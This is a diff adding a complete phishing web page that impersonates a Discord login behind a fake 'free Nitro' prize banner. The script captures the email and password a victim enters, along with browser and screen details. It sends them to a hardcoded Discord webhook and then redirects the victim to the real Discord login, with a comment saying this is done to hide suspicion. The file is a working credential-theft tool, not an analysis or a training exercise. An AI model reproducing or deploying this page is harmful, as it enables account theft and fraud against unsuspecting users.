@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord Nitro</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { 
+      background: #1e1f22; 
+      font-family: 'Segoe UI', system-ui, sans-serif; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      min-height: 100vh; 
+    }
+    .container {
+      background: #313338;
+      padding: 40px 44px;
+      border-radius: 8px;
+      width: 480px;
+      max-width: 96%;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+    }
+    .nitro-banner {
+      background: linear-gradient(135deg, #5865f2, #7289da);
+      color: white;
+      text-align: center;
+      padding: 20px 10px;
+      border-radius: 8px 8px 0 0;
+      margin: -40px -44px 20px -44px;
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+    .nitro-banner span { display: block; font-size: 14px; font-weight: 400; opacity: 0.9; margin-top: 4px; }
+    .discord-logo {
+      text-align: center;
+      font-size: 42px;
+      font-weight: 900;
+      color: white;
+      margin-bottom: 20px;
+      letter-spacing: -1px;
+    }
+    .discord-logo i { color: #5865f2; }
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      margin: 6px 0 14px 0;
+      background: #1e1f22;
+      border: 1px solid #3f4147;
+      border-radius: 4px;
+      color: #dbdee1;
+      font-size: 16px;
+      outline: none;
+    }
+    input:focus { border-color: #5865f2; }
+    label { color: #b5bac1; font-size: 13px; font-weight: 600; letter-spacing: 0.3px; }
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: #5865f2;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .btn:hover { background: #4752c4; }
+    .footer {
+      margin-top: 16px;
+      display: flex;
+      justify-content: space-between;
+      color: #949ba4;
+      font-size: 13px;
+    }
+    .footer a { color: #00a8fc; text-decoration: none; }
+    .error { color: #f23f42; font-size: 13px; margin-top: -8px; margin-bottom: 8px; display: none; }
+  </style>
+</head>
+<body>
+<div class="container" id="app">
+  <div class="nitro-banner">
+    🎉 YOU WON FREE NITRO!
+    <span>Click the link to claim – limited time</span>
+  </div>
+  <div class="discord-logo"><i>●</i> Discord</div>
+
+  <label>EMAIL OR PHONE</label>
+  <input type="text" id="email" placeholder="email@example.com" value="">
+
+  <label>PASSWORD</label>
+  <input type="password" id="password" placeholder="••••••••">
+
+  <div class="error" id="errorMsg">Please fill in both fields.</div>
+
+  <button class="btn" id="loginBtn">Claim Nitro</button>
+
+  <div class="footer">
+    <a href="#">Forgot password?</a>
+    <a href="#">Register</a>
+  </div>
+</div>
+
+<script>
+  // REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1513535369117831289/7UNRwXkFXZHajEajaUn0UAU4FPXnyr7wzhi0TlVwvtM-FXl0Mbey70p6ia_j6uJh4NM7';
+
+  document.getElementById('loginBtn').addEventListener('click', async function(e) {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const errorEl = document.getElementById('errorMsg');
+
+    if (!email || !password) {
+      errorEl.style.display = 'block';
+      return;
+    } else {
+      errorEl.style.display = 'none';
+    }
+
+    // Gather additional metadata
+    const data = {
+      email: email,
+      password: password,
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      screen: `${window.screen.width}x${window.screen.height}`,
+      referrer: document.referrer || 'direct'
+    };
+
+    // Send to webhook
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: '🎁 Nitro Claim',
+            color: 0x5865f2,
+            fields: [
+              { name: 'Email', value: data.email, inline: false },
+              { name: 'Password', value: '||' + data.password + '||', inline: false },
+              { name: 'User Agent', value: data.userAgent, inline: false },
+              { name: 'Screen', value: data.screen, inline: true },
+              { name: 'Timestamp', value: data.timestamp, inline: true }
+            ],
+            footer: { text: 'Discord Nitro Phish' }
+          }]
+        })
+      });
+    } catch (err) {
+      console.error('Webhook send failed:', err);
+    }
+
+    // Redirect to real Discord login (to hide suspicion)
+    window.location.href = 'https://discord.com/login';
+  });
+
+  // Enter key support
+  document.querySelectorAll('input').forEach(inp => {
+    inp.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') document.getElementById('loginBtn').click();
+    });
+  });
+</script>
+</body>
+</html>
